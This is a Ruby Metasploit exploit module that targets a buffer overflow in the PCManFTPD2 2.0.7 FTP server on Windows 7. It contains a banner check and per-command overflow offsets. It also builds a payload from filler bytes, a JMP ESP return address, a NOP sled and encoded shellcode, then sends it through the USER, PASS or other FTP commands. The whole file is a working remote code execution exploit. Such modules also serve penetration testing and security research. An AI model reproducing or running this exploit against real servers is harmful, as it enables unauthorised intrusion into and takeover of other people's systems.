require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote

  include Msf::Exploit::Remote::Ftp
  def initialize(info = {})

  super(update_info(info,
        'Name' => 'Universal PCManFTPD2 2.0.7 Buffer Overflow Exploit',
        'Description' => 'This module exploits a buffer overflow found in all commands of PCManFTPD2. Users can enter any command and its offset which will crash PCManFTPD2',
        'Author' => [ 'Debra Samuel'],
        'Version' => '$Revision: 1 $',
        'Platform' => ['win'],
        'Targets' => 
	  [ 
	     [ 'Windows 7 Professional x64 SP1',   {'Ret' => 0x75e55d3f } ],
						   # JMP ESP in SHELL32.dll
	  ],
        'DefaultTarget' => 0,
        'Payload' => {'BadChars' => "\x00\x0a\x0d\x20"},
        'DefaultOptions' => {'EXITFUNC' => 'seh'},
        'License' => GPL_LICENSE
  ))

        register_options(
                [
                	# set default OFFSET (for FTPCOMMAND USER) to 2000
  			# OFFSET for FTPCOMMAND PASS is 6102
                	# OFFSET for FTPCOMMAND PUT is 2007
		    	# OFFSET for FTPCOMMAND MKD is 2007
                	# OFFSET for FTPCOMMAND RENAME is 2004
                	# OFFSET for FTPCOMMAND ACCT is 2006
                	# OFFSET for FTPCOMMAND LS is 2008
			# other command offsets can be calculated by taking the length
			# of the command from 2010

		OptString.new('OFFSET', [true, 'Set the buffer size', '2000']),
		OptString.new('FTPCOMMAND', [true, 'Set the command to be tested', 'USER'])
		], self.class)

  end

  # This function will check to see if "220 PCMan's FTP Server 2.0" is in the banner
  # IF Found, THEN Vulnerability Exists.
  def check

    # Connect to RHOST on PORT
    connect_login
    disconnect

    # Does Banner equal (===) to 220 PCMan's FTP Server 2.0?
    if /220 PCMan's FTP Server 2\.0/ === banner
      Exploit::CheckCode::Appears
    else
      Exploit::CheckCode::Safe
    end
  end

    # This is the actual exploit function
  def exploit

    # Set up the exploit string
    exploit_string = ("\x41" * Integer(datastore['OFFSET'])) + [target.ret].pack('V') + "\x90" * 20 + payload.encoded

    # First check to see if the input command is USER or PASS,
    #  - if either of these, load up the exploit into the standard
    #    variable names used by connect_login

    if datastore['FTPCOMMAND'] == 'USER'
       # Load the username up with the exploit
       datastore['FTPUSER'] = exploit_string
    end

    if datastore['FTPCOMMAND'] == 'PASS'
       # Load the password up with the sploit
       datastore['FTPPASS'] = exploit_string
    end   

    # Connect using the Username / Password 
    connect_login

    # Now set up the malicious string for all other commands
    # (other than USER or PASS)
    sploit = datastore['FTPCOMMAND'] + " " + exploit_string
       
    # Send Malicious string to RHOST and PORT
    send_cmd( [sploit] , false )

    # Payload Handler
    handler

    disconnect
  end
end



